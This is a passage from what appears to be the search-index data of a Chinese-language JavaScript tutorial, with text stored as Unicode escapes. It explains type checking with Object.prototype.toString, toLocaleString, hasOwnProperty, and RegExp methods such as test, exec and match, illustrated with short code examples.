\u65b9\u6cd5\uff0c\u53ef\u4ee5\u5728\u4efb\u610f\u503c\u4e0a\u8c03\u7528\u8fd9\u4e2a\u65b9\u6cd5\uff0c\u5e2e\u52a9\u6211\u4eec\u5224\u65ad\u8fd9\u4e2a\u503c\u7684\u7c7b\u578b\u3002 1 Object . prototype . toString . call ( value ) \u4e0a\u9762\u4ee3\u7801\u8868\u793a\u5bf9 value \u8fd9\u4e2a\u503c\u8c03\u7528 Object.prototype.toString \u65b9\u6cd5\u3002 \u4e0d\u540c\u6570\u636e\u7c7b\u578b\u7684 Object.prototype.toString \u65b9\u6cd5\u8fd4\u56de\u503c\u5982\u4e0b\u3002 \u6570\u503c\uff1a\u8fd4\u56de [object Number] \u3002 \u5b57\u7b26\u4e32\uff1a\u8fd4\u56de [object String] \u3002 \u5e03\u5c14\u503c\uff1a\u8fd4\u56de [object Boolean] \u3002 undefined\uff1a\u8fd4\u56de [object Undefined] \u3002 null\uff1a\u8fd4\u56de [object Null] \u3002 \u6570\u7ec4\uff1a\u8fd4\u56de [object Array] \u3002 arguments \u5bf9\u8c61\uff1a\u8fd4\u56de [object Arguments] \u3002 \u51fd\u6570\uff1a\u8fd4\u56de [object Function] \u3002 Error \u5bf9\u8c61\uff1a\u8fd4\u56de [object Error] \u3002 Date \u5bf9\u8c61\uff1a\u8fd4\u56de [object Date] \u3002 RegExp \u5bf9\u8c61\uff1a\u8fd4\u56de [object RegExp] \u3002 \u5176\u4ed6\u5bf9\u8c61\uff1a\u8fd4\u56de [object Object] \u3002 \u8fd9\u5c31\u662f\u8bf4\uff0c Object.prototype.toString \u53ef\u4ee5\u770b\u51fa\u4e00\u4e2a\u503c\u5230\u5e95\u662f\u4ec0\u4e48\u7c7b\u578b\u3002 1 2 3 4 5 6 7 8 Object . prototype . toString . call ( 2 ) // \"[object Number]\" Object . prototype . toString . call ( '' ) // \"[object String]\" Object . prototype . toString . call ( true ) // \"[object Boolean]\" Object . prototype . toString . call ( undefined ) // \"[object Undefined]\" Object . prototype . toString . call ( null ) // \"[object Null]\" Object . prototype . toString . call ( Math ) // \"[object Math]\" Object . prototype . toString . call ({}) // \"[object Object]\" Object . prototype . toString . call ([]) // \"[object Array]\" \u5229\u7528\u8fd9\u4e2a\u7279\u6027\uff0c\u53ef\u4ee5\u5199\u51fa\u4e00\u4e2a\u6bd4 typeof \u8fd0\u7b97\u7b26\u66f4\u51c6\u786e\u7684\u7c7b\u578b\u5224\u65ad\u51fd\u6570\u3002 1 2 3 4 5 6 7 8 9 10 11 12 var type = function ( o ){ var s = Object . prototype . toString . call ( o ); return s . match ( /\\[object (.*?)\\]/ )[ 1 ]. toLowerCase (); }; type ({}); // \"object\" type ([]); // \"array\" type ( 5 ); // \"number\" type ( null ); // \"null\" type (); // \"undefined\" type ( /abcd/ ); // \"regex\" type ( new Date ()); // \"date\" \u5728\u4e0a\u9762\u8fd9\u4e2a type \u51fd\u6570\u7684\u57fa\u7840\u4e0a\uff0c\u8fd8\u53ef\u4ee5\u52a0\u4e0a\u4e13\u95e8\u5224\u65ad\u67d0\u79cd\u7c7b\u578b\u6570\u636e\u7684\u65b9\u6cd5\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 var type = function ( o ){ var s = Object . prototype . toString . call ( o ); return s . match ( /\\[object (.*?)\\]/ )[ 1 ]. toLowerCase (); }; [ 'Null' , 'Undefined' , 'Object' , 'Array' , 'String' , 'Number' , 'Boolean' , 'Function' , 'RegExp' ]. forEach ( function ( t ) { type [ 'is' + t ] = function ( o ) { return type ( o ) === t . toLowerCase (); }; }); type . isObject ({}) // true type . isNumber ( NaN ) // true type . isRegExp ( /abc/ ) // true","title":"toString() \u7684\u5e94\u7528\uff1a\u5224\u65ad\u6570\u636e\u7c7b\u578b"},{"location":"stdlib/object/#objectprototypetolocalestring","text":"Object.prototype.toLocaleString \u65b9\u6cd5\u4e0e toString \u7684\u8fd4\u56de\u7ed3\u679c\u76f8\u540c\uff0c\u4e5f\u662f\u8fd4\u56de\u4e00\u4e2a\u503c\u7684\u5b57\u7b26\u4e32\u5f62\u5f0f\u3002 1 2 3 var obj = {}; obj . toString ( obj ) // \"[object Object]\" obj . toLocaleString ( obj ) // \"[object Object]\" \u8fd9\u4e2a\u65b9\u6cd5\u7684\u4e3b\u8981\u4f5c\u7528\u662f\u7559\u51fa\u4e00\u4e2a\u63a5\u53e3\uff0c\u8ba9\u5404\u79cd\u4e0d\u540c\u7684\u5bf9\u8c61\u5b9e\u73b0\u81ea\u5df1\u7248\u672c\u7684 toLocaleString \uff0c\u7528\u6765\u8fd4\u56de\u9488\u5bf9\u67d0\u4e9b\u5730\u57df\u7684\u7279\u5b9a\u7684\u503c\u3002 1 2 3 4 5 6 7 8 9 10 11 var person = { toString : function () { return 'Henry Norman Bethune' ; }, toLocaleString : function () { return '\u767d\u6c42\u6069' ; } }; person . toString () // Henry Norman Bethune person . toLocaleString () // \u767d\u6c42\u6069 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c toString() \u65b9\u6cd5\u8fd4\u56de\u5bf9\u8c61\u7684\u4e00\u822c\u5b57\u7b26\u4e32\u5f62\u5f0f\uff0c toLocaleString() \u65b9\u6cd5\u8fd4\u56de\u672c\u5730\u7684\u5b57\u7b26\u4e32\u5f62\u5f0f\u3002 \u76ee\u524d\uff0c\u4e3b\u8981\u6709\u4e09\u4e2a\u5bf9\u8c61\u81ea\u5b9a\u4e49\u4e86 toLocaleString \u65b9\u6cd5\u3002 Array.prototype.toLocaleString() Number.prototype.toLocaleString() Date.prototype.toLocaleString() \u4e3e\u4f8b\u6765\u8bf4\uff0c\u65e5\u671f\u7684\u5b9e\u4f8b\u5bf9\u8c61\u7684 toString \u548c toLocaleString \u8fd4\u56de\u503c\u5c31\u4e0d\u4e00\u6837\uff0c\u800c\u4e14 toLocaleString \u7684\u8fd4\u56de\u503c\u8ddf\u7528\u6237\u8bbe\u5b9a\u7684\u6240\u5728\u5730\u57df\u76f8\u5173\u3002 1 2 3 var date = new Date (); date . toString () // \"Tue Jan 01 2018 12:01:33 GMT+0800 (CST)\" date . toLocaleString () // \"1/01/2018, 12:01:33 PM\"","title":"Object.prototype.toLocaleString()"},{"location":"stdlib/object/#objectprototypehasownproperty","text":"Object.prototype.hasOwnProperty \u65b9\u6cd5\u63a5\u53d7\u4e00\u4e2a\u5b57\u7b26\u4e32\u4f5c\u4e3a\u53c2\u6570\uff0c\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u8be5\u5b9e\u4f8b\u5bf9\u8c61\u81ea\u8eab\u662f\u5426\u5177\u6709\u8be5\u5c5e\u6027\u3002 1 2 3 4 5 6 var obj = { p : 123 }; obj . hasOwnProperty ( 'p' ) // true obj . hasOwnProperty ( 'toString' ) // false \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5bf9\u8c61 obj \u81ea\u8eab\u5177\u6709 p \u5c5e\u6027\uff0c\u6240\u4ee5\u8fd4\u56de true \u3002 toString \u5c5e\u6027\u662f\u7ee7\u627f\u7684\uff0c\u6240\u4ee5\u8fd4\u56de false \u3002","title":"Object.prototype.hasOwnProperty()"},{"location":"stdlib/object/#_3","text":"Axel Rauschmayer, Protecting objects in JavaScript kangax, Understanding delete Jon Bretman, Type Checking in JavaScript Cody Lindley, Thinking About ECMAScript 5 Parts Bjorn Tipling, Advanced objects in JavaScript Javier M\u00e1rquez, JavaScript properties are enumerable, writable and configurable Sella Rafaeli, Native JavaScript Data-Binding : \u4f7f\u7528\u5b58\u53d6\u51fd\u6570\u5b9e\u73b0model\u4e0eview\u7684\u53cc\u5411\u7ed1\u5b9a Lea Verou, Copying object properties, the robust way","title":"\u53c2\u8003\u94fe\u63a5"},{"location":"stdlib/regexp/","text":"RegExp \u5bf9\u8c61 \u00b6 RegExp \u5bf9\u8c61\u63d0\u4f9b\u6b63\u5219\u8868\u8fbe\u5f0f\u7684\u529f\u80fd\u3002 \u6982\u8ff0 \u00b6 \u6b63\u5219\u8868\u8fbe\u5f0f\uff08regular expression\uff09\u662f\u4e00\u79cd\u8868\u8fbe\u6587\u672c\u6a21\u5f0f\uff08\u5373\u5b57\u7b26\u4e32\u7ed3\u6784\uff09\u7684\u65b9\u6cd5\uff0c\u6709\u70b9\u50cf\u5b57\u7b26\u4e32\u7684\u6a21\u677f\uff0c\u5e38\u5e38\u7528\u6765\u6309\u7167\u201c\u7ed9\u5b9a\u6a21\u5f0f\u201d\u5339\u914d\u6587\u672c\u3002\u6bd4\u5982\uff0c\u6b63\u5219\u8868\u8fbe\u5f0f\u7ed9\u51fa\u4e00\u4e2a Email \u5730\u5740\u7684\u6a21\u5f0f\uff0c\u7136\u540e\u7528\u5b83\u6765\u786e\u5b9a\u4e00\u4e2a\u5b57\u7b26\u4e32\u662f\u5426\u4e3a Email \u5730\u5740\u3002JavaScript \u7684\u6b63\u5219\u8868\u8fbe\u5f0f\u4f53\u7cfb\u662f\u53c2\u7167 Perl 5 \u5efa\u7acb\u7684\u3002 \u65b0\u5efa\u6b63\u5219\u8868\u8fbe\u5f0f\u6709\u4e24\u79cd\u65b9\u6cd5\u3002\u4e00\u79cd\u662f\u4f7f\u7528\u5b57\u9762\u91cf\uff0c\u4ee5\u659c\u6760\u8868\u793a\u5f00\u59cb\u548c\u7ed3\u675f\u3002 1 var regex = /xyz/ ; \u53e6\u4e00\u79cd\u662f\u4f7f\u7528 RegExp \u6784\u9020\u51fd\u6570\u3002 1 var regex = new RegExp ( 'xyz' ); \u4e0a\u9762\u4e24\u79cd\u5199\u6cd5\u662f\u7b49\u4ef7\u7684\uff0c\u90fd\u65b0\u5efa\u4e86\u4e00\u4e2a\u5185\u5bb9\u4e3a xyz \u7684\u6b63\u5219\u8868\u8fbe\u5f0f\u5bf9\u8c61\u3002\u5b83\u4eec\u7684\u4e3b\u8981\u533a\u522b\u662f\uff0c\u7b2c\u4e00\u79cd\u65b9\u6cd5\u5728\u5f15\u64ce\u7f16\u8bd1\u4ee3\u7801\u65f6\uff0c\u5c31\u4f1a\u65b0\u5efa\u6b63\u5219\u8868\u8fbe\u5f0f\uff0c\u7b2c\u4e8c\u79cd\u65b9\u6cd5\u5728\u8fd0\u884c\u65f6\u65b0\u5efa\u6b63\u5219\u8868\u8fbe\u5f0f\uff0c\u6240\u4ee5\u524d\u8005\u7684\u6548\u7387\u8f83\u9ad8\u3002\u800c\u4e14\uff0c\u524d\u8005\u6bd4\u8f83\u4fbf\u5229\u548c\u76f4\u89c2\uff0c\u6240\u4ee5\u5b9e\u9645\u5e94\u7528\u4e2d\uff0c\u57fa\u672c\u4e0a\u90fd\u91c7\u7528\u5b57\u9762\u91cf\u5b9a\u4e49\u6b63\u5219\u8868\u8fbe\u5f0f\u3002 RegExp \u6784\u9020\u51fd\u6570\u8fd8\u53ef\u4ee5\u63a5\u53d7\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c\u8868\u793a\u4fee\u9970\u7b26\uff08\u8be6\u7ec6\u89e3\u91ca\u89c1\u4e0b\u6587\uff09\u3002 1 2 3 var regex = new RegExp ( 'xyz' , 'i' ); // \u7b49\u4ef7\u4e8e var regex = /xyz/i ; \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6b63\u5219\u8868\u8fbe\u5f0f /xyz/ \u6709\u4e00\u4e2a\u4fee\u9970\u7b26 i \u3002 \u5b9e\u4f8b\u5c5e\u6027 \u00b6 \u6b63\u5219\u5bf9\u8c61\u7684\u5b9e\u4f8b\u5c5e\u6027\u5206\u6210\u4e24\u7c7b\u3002 \u4e00\u7c7b\u662f\u4fee\u9970\u7b26\u76f8\u5173\uff0c\u7528\u4e8e\u4e86\u89e3\u8bbe\u7f6e\u4e86\u4ec0\u4e48\u4fee\u9970\u7b26\u3002 RegExp.prototype.ignoreCase \uff1a\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u662f\u5426\u8bbe\u7f6e\u4e86 i \u4fee\u9970\u7b26\u3002 RegExp.prototype.global \uff1a\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u662f\u5426\u8bbe\u7f6e\u4e86 g \u4fee\u9970\u7b26\u3002 RegExp.prototype.multiline \uff1a\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u662f\u5426\u8bbe\u7f6e\u4e86 m \u4fee\u9970\u7b26\u3002 RegExp.prototype.flags \uff1a\u8fd4\u56de\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u5305\u542b\u4e86\u5df2\u7ecf\u8bbe\u7f6e\u7684\u6240\u6709\u4fee\u9970\u7b26\uff0c\u6309\u5b57\u6bcd\u6392\u5e8f\u3002 \u4e0a\u9762\u56db\u4e2a\u5c5e\u6027\u90fd\u662f\u53ea\u8bfb\u7684\u3002 1 2 3 4 5 6 var r = /abc/igm ; r . ignoreCase // true r . global // true r . multiline // true r . flags // 'gim' \u53e6\u4e00\u7c7b\u662f\u4e0e\u4fee\u9970\u7b26\u65e0\u5173\u7684\u5c5e\u6027\uff0c\u4e3b\u8981\u662f\u4e0b\u9762\u4e24\u4e2a\u3002 RegExp.prototype.lastIndex \uff1a\u8fd4\u56de\u4e00\u4e2a\u6574\u6570\uff0c\u8868\u793a\u4e0b\u4e00\u6b21\u5f00\u59cb\u641c\u7d22\u7684\u4f4d\u7f6e\u3002\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\uff0c\u4f46\u662f\u53ea\u5728\u8fdb\u884c\u8fde\u7eed\u641c\u7d22\u65f6\u6709\u610f\u4e49\uff0c\u8be6\u7ec6\u4ecb\u7ecd\u8bf7\u770b\u540e\u6587\u3002 RegExp.prototype.source \uff1a\u8fd4\u56de\u6b63\u5219\u8868\u8fbe\u5f0f\u7684\u5b57\u7b26\u4e32\u5f62\u5f0f\uff08\u4e0d\u5305\u62ec\u53cd\u659c\u6760\uff09\uff0c\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002 1 2 3 4 var r = /abc/igm ; r . lastIndex // 0 r . source // \"abc\" \u5b9e\u4f8b\u65b9\u6cd5 \u00b6 RegExp.prototype.test() \u00b6 \u6b63\u5219\u5b9e\u4f8b\u5bf9\u8c61\u7684 test \u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u5f53\u524d\u6a21\u5f0f\u662f\u5426\u80fd\u5339\u914d\u53c2\u6570\u5b57\u7b26\u4e32\u3002 1 /cat/ . test ( 'cats and dogs' ) // true \u4e0a\u9762\u4ee3\u7801\u9a8c\u8bc1\u53c2\u6570\u5b57\u7b26\u4e32\u4e4b\u4e2d\u662f\u5426\u5305\u542b cat \uff0c\u7ed3\u679c\u8fd4\u56de true \u3002 \u5982\u679c\u6b63\u5219\u8868\u8fbe\u5f0f\u5e26\u6709 g \u4fee\u9970\u7b26\uff0c\u5219\u6bcf\u4e00\u6b21 test \u65b9\u6cd5\u90fd\u4ece\u4e0a\u4e00\u6b21\u7ed3\u675f\u7684\u4f4d\u7f6e\u5f00\u59cb\u5411\u540e\u5339\u914d\u3002 1 2 3 4 5 6 7 8 9 10 11 var r = /x/g ; var s = '_x_x' ; r . lastIndex // 0 r . test ( s ) // true r . lastIndex // 2 r . test ( s ) // true r . lastIndex // 4 r . test ( s ) // false \u4e0a\u9762\u4ee3\u7801\u7684\u6b63\u5219\u8868\u8fbe\u5f0f\u4f7f\u7528\u4e86 g \u4fee\u9970\u7b26\uff0c\u8868\u793a\u662f\u5168\u5c40\u641c\u7d22\uff0c\u4f1a\u6709\u591a\u4e2a\u7ed3\u679c\u3002\u63a5\u7740\uff0c\u4e09\u6b21\u4f7f\u7528 test \u65b9\u6cd5\uff0c\u6bcf\u4e00\u6b21\u5f00\u59cb\u641c\u7d22\u7684\u4f4d\u7f6e\u90fd\u662f\u4e0a\u4e00\u6b21\u5339\u914d\u7684\u540e\u4e00\u4e2a\u4f4d\u7f6e\u3002 \u5e26\u6709 g \u4fee\u9970\u7b26\u65f6\uff0c\u53ef\u4ee5\u901a\u8fc7\u6b63\u5219\u5bf9\u8c61\u7684 lastIndex \u5c5e\u6027\u6307\u5b9a\u5f00\u59cb\u641c\u7d22\u7684\u4f4d\u7f6e\u3002 1 2 3 4 5 6 7 8 var r = /x/g ; var s = '_x_x' ; r . lastIndex = 4 ; r . test ( s ) // false r . lastIndex // 0 r . test ( s ) \u4e0a\u9762\u4ee3\u7801\u6307\u5b9a\u4ece\u5b57\u7b26\u4e32\u7684\u7b2c\u4e94\u4e2a\u4f4d\u7f6e\u5f00\u59cb\u641c\u7d22\uff0c\u8fd9\u4e2a\u4f4d\u7f6e\u4e3a\u7a7a\uff0c\u6240\u4ee5\u8fd4\u56de false \u3002\u540c\u65f6\uff0c lastIndex \u5c5e\u6027\u91cd\u7f6e\u4e3a 0 \uff0c\u6240\u4ee5\u7b2c\u4e8c\u6b21\u6267\u884c r.test(s) \u4f1a\u8fd4\u56de true \u3002 \u6ce8\u610f\uff0c\u5e26\u6709 g \u4fee\u9970\u7b26\u65f6\uff0c\u6b63\u5219\u8868\u8fbe\u5f0f\u5185\u90e8\u4f1a\u8bb0\u4f4f\u4e0a\u4e00\u6b21\u7684 lastIndex \u5c5e\u6027\uff0c\u8fd9\u65f6\u4e0d\u5e94\u8be5\u66f4\u6362\u6240\u8981\u5339\u914d\u7684\u5b57\u7b26\u4e32\uff0c\u5426\u5219\u4f1a\u6709\u4e00\u4e9b\u96be\u4ee5\u5bdf\u89c9\u7684\u9519\u8bef\u3002 1 2 3 var r = /bb/g ; r . test ( 'bb' ) // true r . test ( '-bb-' ) // false \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u7531\u4e8e\u6b63\u5219\u8868\u8fbe\u5f0f r \u662f\u4ece\u4e0a\u4e00\u6b21\u7684 lastIndex \u4f4d\u7f6e\u5f00\u59cb\u5339\u914d\uff0c\u5bfc\u81f4\u7b2c\u4e8c\u6b21\u6267\u884c test \u65b9\u6cd5\u65f6\u51fa\u73b0\u9884\u671f\u4ee5\u5916\u7684\u7ed3\u679c\u3002 lastIndex \u5c5e\u6027\u53ea\u5bf9\u540c\u4e00\u4e2a\u6b63\u5219\u8868\u8fbe\u5f0f\u6709\u6548\uff0c\u6240\u4ee5\u4e0b\u9762\u8fd9\u6837\u5199\u662f\u9519\u8bef\u7684\u3002 1 2 var count = 0 ; while ( /a/g . test ( 'babaa' )) count ++ ; \u4e0a\u9762\u4ee3\u7801\u4f1a\u5bfc\u81f4\u65e0\u9650\u5faa\u73af\uff0c\u56e0\u4e3a while \u5faa\u73af\u7684\u6bcf\u6b21\u5339\u914d\u6761\u4ef6\u90fd\u662f\u4e00\u4e2a\u65b0\u7684\u6b63\u5219\u8868\u8fbe\u5f0f\uff0c\u5bfc\u81f4 lastIndex \u5c5e\u6027\u603b\u662f\u7b49\u4e8e0\u3002 \u5982\u679c\u6b63\u5219\u6a21\u5f0f\u662f\u4e00\u4e2a\u7a7a\u5b57\u7b26\u4e32\uff0c\u5219\u5339\u914d\u6240\u6709\u5b57\u7b26\u4e32\u3002 1 2 new RegExp ( '' ). test ( 'abc' ) // true RegExp.prototype.exec() \u00b6 \u6b63\u5219\u5b9e\u4f8b\u5bf9\u8c61\u7684 exec() \u65b9\u6cd5\uff0c\u7528\u6765\u8fd4\u56de\u5339\u914d\u7ed3\u679c\u3002\u5982\u679c\u53d1\u73b0\u5339\u914d\uff0c\u5c31\u8fd4\u56de\u4e00\u4e2a\u6570\u7ec4\uff0c\u6210\u5458\u662f\u5339\u914d\u6210\u529f\u7684\u5b50\u5b57\u7b26\u4e32\uff0c\u5426\u5219\u8fd4\u56de null \u3002 1 2 3 4 5 6 var s = '_x_x' ; var r1 = /x/ ; var r2 = /y/ ; r1 . exec ( s ) // [\"x\"] r2 . exec ( s ) // null \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6b63\u5219\u5bf9\u8c61 r1 \u5339\u914d\u6210\u529f\uff0c\u8fd4\u56de\u4e00\u4e2a\u6570\u7ec4\uff0c\u6210\u5458\u662f\u5339\u914d\u7ed3\u679c\uff1b\u6b63\u5219\u5bf9\u8c61 r2 \u5339\u914d\u5931\u8d25\uff0c\u8fd4\u56de null \u3002 \u5982\u679c\u6b63\u5219\u8868\u793a\u5f0f\u5305\u542b\u5706\u62ec\u53f7\uff08\u5373\u542b\u6709\u201c\u7ec4\u5339\u914d\u201d\uff09\uff0c\u5219\u8fd4\u56de\u7684\u6570\u7ec4\u4f1a\u5305\u62ec\u591a\u4e2a\u6210\u5458\u3002\u7b2c\u4e00\u4e2a\u6210\u5458\u662f\u6574\u4e2a\u5339\u914d\u6210\u529f\u7684\u7ed3\u679c\uff0c\u540e\u9762\u7684\u6210\u5458\u5c31\u662f\u5706\u62ec\u53f7\u5bf9\u5e94\u7684\u5339\u914d\u6210\u529f\u7684\u7ec4\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u7b2c\u4e8c\u4e2a\u6210\u5458\u5bf9\u5e94\u7b2c\u4e00\u4e2a\u62ec\u53f7\uff0c\u7b2c\u4e09\u4e2a\u6210\u5458\u5bf9\u5e94\u7b2c\u4e8c\u4e2a\u62ec\u53f7\uff0c\u4ee5\u6b64\u7c7b\u63a8\u3002\u6574\u4e2a\u6570\u7ec4\u7684 length \u5c5e\u6027\u7b49\u4e8e\u7ec4\u5339\u914d\u7684\u6570\u91cf\u518d\u52a01\u3002 1 2 3 4 var s = '_x_x' ; var r = /_(x)/ ; r . exec ( s ) // [\"_x\", \"x\"] \u4e0a\u9762\u4ee3\u7801\u7684 exec() \u65b9\u6cd5\uff0c\u8fd4\u56de\u4e00\u4e2a\u6570\u7ec4\u3002\u7b2c\u4e00\u4e2a\u6210\u5458\u662f\u6574\u4e2a\u5339\u914d\u7684\u7ed3\u679c\uff0c\u7b2c\u4e8c\u4e2a\u6210\u5458\u662f\u5706\u62ec\u53f7\u5339\u914d\u7684\u7ed3\u679c\u3002 exec() \u65b9\u6cd5\u7684\u8fd4\u56de\u6570\u7ec4\u8fd8\u5305\u542b\u4ee5\u4e0b\u4e24\u4e2a\u5c5e\u6027\uff1a input \uff1a\u6574\u4e2a\u539f\u5b57\u7b26\u4e32\u3002 index \uff1a\u6a21\u5f0f\u5339\u914d\u6210\u529f\u7684\u5f00\u59cb\u4f4d\u7f6e\uff08\u4ece0\u5f00\u59cb\u8ba1\u6570\uff09\u3002 1 2 3 4 5 6 7 var r = /a(b+)a/ ; var arr = r . exec ( '_abbba_aba_' ); arr // [\"abbba\", \"bbb\"] arr . index // 1 arr . input // \"_abbba_aba_\" \u4e0a\u9762\u4ee3\u7801\u4e2d\u7684 index \u5c5e\u6027\u7b49\u4e8e1\uff0c\u662f\u56e0\u4e3a\u4ece\u539f\u5b57\u7b26\u4e32\u7684\u7b2c\u4e8c\u4e2a\u4f4d\u7f6e\u5f00\u59cb\u5339\u914d\u6210\u529f\u3002 \u5982\u679c\u6b63\u5219\u8868\u8fbe\u5f0f\u52a0\u4e0a g \u4fee\u9970\u7b26\uff0c\u5219\u53ef\u4ee5\u4f7f\u7528\u591a\u6b21 exec() \u65b9\u6cd5\uff0c\u4e0b\u4e00\u6b21\u641c\u7d22\u7684\u4f4d\u7f6e\u4ece\u4e0a\u4e00\u6b21\u5339\u914d\u6210\u529f\u7ed3\u675f\u7684\u4f4d\u7f6e\u5f00\u59cb\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 var reg = /a/g ; var str = 'abc_abc_abc' var r1 = reg . exec ( str ); r1 // [\"a\"] r1 . index // 0 reg . lastIndex // 1 var r2 = reg . exec ( str ); r2 // [\"a\"] r2 . index // 4 reg . lastIndex // 5 var r3 = reg . exec ( str ); r3 // [\"a\"] r3 . index // 8 reg . lastIndex // 9 var r4 = reg . exec ( str ); r4 // null reg . lastIndex // 0 \u4e0a\u9762\u4ee3\u7801\u8fde\u7eed\u7528\u4e86\u56db\u6b21 exec() \u65b9\u6cd5\uff0c\u524d\u4e09\u6b21\u90fd\u662f\u4ece\u4e0a\u4e00\u6b21\u5339\u914d\u7ed3\u675f\u7684\u4f4d\u7f6e\u5411\u540e\u5339\u914d\u3002\u5f53\u7b2c\u4e09\u6b21\u5339\u914d\u7ed3\u675f\u4ee5\u540e\uff0c\u6574\u4e2a\u5b57\u7b26\u4e32\u5df2\u7ecf\u5230\u8fbe\u5c3e\u90e8\uff0c\u5339\u914d\u7ed3\u679c\u8fd4\u56de null \uff0c\u6b63\u5219\u5b9e\u4f8b\u5bf9\u8c61\u7684 lastIndex \u5c5e\u6027\u4e5f\u91cd\u7f6e\u4e3a 0 \uff0c\u610f\u5473\u7740\u7b2c\u56db\u6b21\u5339\u914d\u5c06\u4ece\u5934\u5f00\u59cb\u3002 \u5229\u7528 g \u4fee\u9970\u7b26\u5141\u8bb8\u591a\u6b21\u5339\u914d\u7684\u7279\u70b9\uff0c\u53ef\u4ee5\u7528\u4e00\u4e2a\u5faa\u73af\u5b8c\u6210\u5168\u90e8\u5339\u914d\u3002 1 2 3 4 5 6 7 8 9 10 11 var reg = /a/g ; var str = 'abc_abc_abc' while ( true ) { var match = reg . exec ( str ); if ( ! match ) break ; console . log ( '#' + match . index + ':' + match [ 0 ]); } // #0:a // #4:a // #8:a \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u53ea\u8981 exec() \u65b9\u6cd5\u4e0d\u8fd4\u56de null \uff0c\u5c31\u4f1a\u4e00\u76f4\u5faa\u73af\u4e0b\u53bb\uff0c\u6bcf\u6b21\u8f93\u51fa\u5339\u914d\u7684\u4f4d\u7f6e\u548c\u5339\u914d\u7684\u6587\u672c\u3002 \u6b63\u5219\u5b9e\u4f8b\u5bf9\u8c61\u7684 lastIndex \u5c5e\u6027\u4e0d\u4ec5\u53ef\u8bfb\uff0c\u8fd8\u53ef\u5199\u3002\u8bbe\u7f6e\u4e86 g \u4fee\u9970\u7b26\u7684\u65f6\u5019\uff0c\u53ea\u8981\u624b\u52a8\u8bbe\u7f6e\u4e86 lastIndex \u7684\u503c\uff0c\u5c31\u4f1a\u4ece\u6307\u5b9a\u4f4d\u7f6e\u5f00\u59cb\u5339\u914d\u3002 \u5b57\u7b26\u4e32\u7684\u5b9e\u4f8b\u65b9\u6cd5 \u00b6 \u5b57\u7b26\u4e32\u7684\u5b9e\u4f8b\u65b9\u6cd5\u4e4b\u4e2d\uff0c\u67094\u79cd\u4e0e\u6b63\u5219\u8868\u8fbe\u5f0f\u6709\u5173\u3002 String.prototype.match() \uff1a\u8fd4\u56de\u4e00\u4e2a\u6570\u7ec4\uff0c\u6210\u5458\u662f\u6240\u6709\u5339\u914d\u7684\u5b50\u5b57\u7b26\u4e32\u3002 String.prototype.search() \uff1a\u6309\u7167\u7ed9\u5b9a\u7684\u6b63\u5219\u8868\u8fbe\u5f0f\u8fdb\u884c\u641c\u7d22\uff0c\u8fd4\u56de\u4e00\u4e2a\u6574\u6570\uff0c\u8868\u793a\u5339\u914d\u5f00\u59cb\u7684\u4f4d\u7f6e\u3002 String.prototype.replace() \uff1a\u6309\u7167\u7ed9\u5b9a\u7684\u6b63\u5219\u8868\u8fbe\u5f0f\u8fdb\u884c\u66ff\u6362\uff0c\u8fd4\u56de\u66ff\u6362\u540e\u7684\u5b57\u7b26\u4e32\u3002 String.prototype.split() \uff1a\u6309\u7167\u7ed9\u5b9a\u89c4\u5219\u8fdb\u884c\u5b57\u7b26\u4e32\u5206\u5272\uff0c\u8fd4\u56de\u4e00\u4e2a\u6570\u7ec4\uff0c\u5305\u542b\u5206\u5272\u540e\u7684\u5404\u4e2a\u6210\u5458\u3002 String.prototype.match() \u00b6 \u5b57\u7b26\u4e32\u5b9e\u4f8b\u5bf9\u8c61\u7684 match \u65b9\u6cd5\u5bf9\u5b57\u7b26\u4e32\u8fdb\u884c\u6b63\u5219\u5339\u914d\uff0c\u8fd4\u56de\u5339\u914d\u7ed3\u679c\u3002 1 2 3 4 5 6 var s = '_x_x' ; var r1 = /x/ ; var r2 = /y/ ; s . match ( r1 ) // [\"x\"] s . match ( r2 ) // null \u4ece\u4e0a\u9762\u4ee3\u7801\u53ef\u4ee5\u770b\u5230\uff0c\u5b57\u7b26\u4e32\u7684 match \u65b9\u6cd5\u4e0e\u6b63\u5219\u5bf9\u8c61\u7684 exec \u65b9\u6cd5\u975e\u5e38\u7c7b\u4f3c\uff1a\u5339\u914d\u6210\u529f\u8fd4\u56de\u4e00\u4e2a\u6570\u7ec4\uff0c\u5339\u914d\u5931\u8d25\u8fd4\u56de null \u3002 \u5982\u679c\u6b63\u5219\u8868\u8fbe\u5f0f\u5e26\u6709 g \u4fee\u9970\u7b26\uff0c\u5219\u8be5\u65b9\u6cd5\u4e0e\u6b63\u5219\u5bf9\u8c61\u7684 exec \u65b9\u6cd5\u884c\u4e3a\u4e0d\u540c\uff0c\u4f1a\u4e00\u6b21\u6027\u8fd4\u56de\u6240\u6709\u5339\u914d\u6210\u529f\u7684\u7ed3\u679c\u3002 1 2 3 4 5 var s = 'abba' ; var r = /a/g ; s . match ( r ) // [\"a\", \"a\"] r . exec ( s ) // [\"a\"] \u8bbe\u7f6e\u6b63\u5219\u8868\u8fbe\u5f0f\u7684 lastIndex \u5c5e\u6027\uff0c\u5bf9 match \u65b9\u6cd5\u65e0\u6548\uff0c\u5339\u914d\u603b\u662f\u4ece\u5b57\u7b26\u4e32\u7684\u7b2c\u4e00\u4e2a\u5b57\u7b26\u5f00\u59cb\u3002 1 2 3 4 var r = /a|b/g ; r . lastIndex = 7 